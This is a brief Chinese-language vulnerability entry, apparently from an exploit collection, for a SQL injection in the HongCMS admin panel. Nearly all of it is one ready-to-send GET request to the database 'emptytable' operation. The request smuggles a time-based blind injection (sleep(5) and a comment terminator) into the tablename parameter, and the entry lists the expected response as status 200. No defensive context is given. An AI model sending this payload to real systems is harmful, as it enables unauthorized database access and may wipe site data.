# HongCMS后台注入漏洞

HongCMS ｜ SQL注入 ｜ —
- **请求**：`GET /admin/index.php/database/operate?dbaction=emptytable&tablename=hong_acat`+where+cat_id=2+and+sleep(5);%23 HTTP/1.1`
- **响应特征**：200